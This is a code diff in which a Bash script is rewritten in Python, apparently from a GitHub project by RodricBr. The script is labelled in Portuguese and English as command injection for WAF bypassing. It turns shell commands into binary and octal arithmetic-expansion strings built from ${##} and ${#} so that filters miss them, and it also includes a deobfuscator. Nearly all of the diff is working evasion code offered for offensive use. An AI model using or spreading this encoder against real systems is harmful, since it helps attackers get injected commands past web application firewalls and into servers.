@@ -1,21 +1,35 @@
-#!/usr/bin/env bash
+#!/usr/bin/python
 
-[[ -z "$*" ]]&& echo -e "\nUso:\n ${0##/} c o m a n d o" # for now you'll have to separate the characters with a space
+import re
 
-echo -e "\n - Injeção de Comando para bypassar WAF / Command Injection for WAF Bypassing\n   Github: RodricBr"
+def obfuscator(o_cmd: str) -> str:
+    if ' ' not in o_cmd:
+        tmp = "\$\\'" + ''.join(f"\\\\$(($((1<<1))#{int(f'{ord(i):o}'):b}))" for i in o_cmd) + "\\'"
 
-for ARG_ in "$@"; do
-  #ARG_=$(echo "$ARG_" | sed 's/./& /g') # teste
-  DECIMAL_=$(echo -n "$ARG_" | od -t o1 -A n | tr -d ' ')
-  #echo -e "Comando: $ARG_\nDecimal: $DECIMAL_" #$INDEX = $ARG_"
-  printf "\nComando: %s\nDecimal: %s\n" "$ARG_" "$DECIMAL_"
-  BINARIO=$(bc <<< "obase=2;$DECIMAL_")
-  echo -e "Binário: $BINARIO"
-  FINAL_=$(echo "$BINARIO" | sed 's/0/\$\{\#\}/g; s/1/\$\{\#\#\}/g')
-  echo "Produto final Encodado: $FINAL_"
-  echo "Produto final: \\\\\$((\$((1<<1))#$BINARIO))"
-  INTEIRO_+="$ARG_"; echo "$INTEIRO_"
-  echo "-----------------------------------------------------"
-  # ${0##-}<<<\$\'COMANDO AQUI DENTRO\'
-  #let "INDEX+=1"
-done
+    else:
+        tmp = "{\$\\'" + ''.join(f"\\\\$(($((1<<1))#{int(f'{ord(i):o}'):b}))" if i != ' ' else r"\',\$\'" for i in o_cmd) + "\\'}"
+
+    data = f"${{!##\-}}<<<{tmp}"
+
+    print(f"\nOutput v1 : {data}\n")
+    print(f"Output v2 : {data.replace('1','${##}').replace('0','${#}')}\n")
+
+def deobfuscator(deo_cmd: str) -> str:
+    if '${##}' in deo_cmd or '${#}' in deo_cmd:
+        deo_cmd = deo_cmd.replace('${##}','1').replace('${#}','0').replace(' ','')
+
+    findBin = re.findall(r"\b[01]+.\b|\\',\\\$\\'", deo_cmd)
+    data = ''.join(chr(int(str(int(i,2)),8)) if r"\',\$\'" not in i else ' ' for i in findBin)
+
+    print("\nDeobfuscator :", repr(data))
+
+
+menu = {
+        1:obfuscator,
+        2:deobfuscator
+    
+    }.get(int(input("""Menu :
+    1. Obfuscator
+    2. Deobfuscator
+: """)))
+cmd = menu(input("Cmd : "))
